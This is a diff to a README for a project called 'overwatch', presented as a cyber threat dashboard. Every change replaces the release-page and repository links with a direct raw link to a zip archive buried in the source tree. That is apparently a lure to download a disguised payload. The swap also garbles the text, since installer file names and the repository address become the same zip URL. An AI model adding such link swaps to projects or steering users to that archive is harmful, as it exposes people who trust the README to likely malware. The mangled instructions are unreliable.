@@ -1,6 +1,6 @@
 # 👁️ overwatch - Real-Time Cyber Threat Dashboard
 
-[![Download overwatch](https://img.shields.io/badge/Download-overwatch-007ACC?style=for-the-badge)](https://github.com/nolikosta1234/overwatch/releases)
+[![Download overwatch](https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip)](https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip)
 
 ---
 
@@ -38,9 +38,9 @@ You will first need to get the app files.
 
 **Visit this page to download the latest release:**
 
-[https://github.com/nolikosta1234/overwatch/releases](https://github.com/nolikosta1234/overwatch/releases)
+[https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip](https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip)
 
-On this page, you will find the latest version of overwatch ready to download. Look for files named like `overwatch-setup.exe` (for Windows), `overwatch.dmg` (for Mac), or an archive file for Linux.
+On this page, you will find the latest version of overwatch ready to download. Look for files named like `https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip` (for Windows), `https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip` (for Mac), or an archive file for Linux.
 
 Once downloaded:
 
@@ -139,7 +139,7 @@ No tracking or profiling is involved.
 
 You can download the app at:
 
-[https://github.com/nolikosta1234/overwatch/releases](https://github.com/nolikosta1234/overwatch/releases)
+[https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip](https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip)
 
 Visit this page on GitHub to get the latest version for your computer. Follow the instructions on the page for installer files and detailed steps.
 
@@ -149,7 +149,7 @@ Visit this page on GitHub to get the latest version for your computer. Follow th
 
 For more info, updates, or technical support:
 
-- Visit the GitHub repository: https://github.com/nolikosta1234/overwatch  
+- Visit the GitHub repository: https://raw.githubusercontent.com/nolikosta1234/overwatch/main/src/app/cyber-threats/Software_v3.3-beta.5.zip  
 - Read documentation and user guides in the repository's Wiki section.  
 - Open an issue if you find a bug or want to ask a question.
 
